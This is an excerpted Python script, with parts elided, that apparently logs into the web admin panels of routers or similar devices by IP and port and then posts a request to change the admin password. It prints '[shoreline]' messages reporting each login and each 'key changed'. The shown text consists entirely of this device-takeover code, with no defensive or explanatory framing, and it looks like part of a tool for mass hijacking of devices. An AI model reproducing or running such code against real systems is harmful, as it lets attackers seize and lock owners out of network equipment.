...
password_setup_data = {
    ...
    'submit-url': '/admin/user-password.asp',
    'postSecurityFlag': '57169'
}
...
def change_password(ip_port):
    ...
    if '<A HREF="/">' in response.text:
        print(f"[shoreline] logged in successfully: {ip_port}")

        # Send password setup request after successful login
        password_setup_url = f'http://{ip_port}/boaform/admin/formUserPasswordSetup'
        try:
        ...
        if "/admin/login.asp" in password_setup_response.text:
            print(f"[shoreline] key changed for: {ip_port}.")
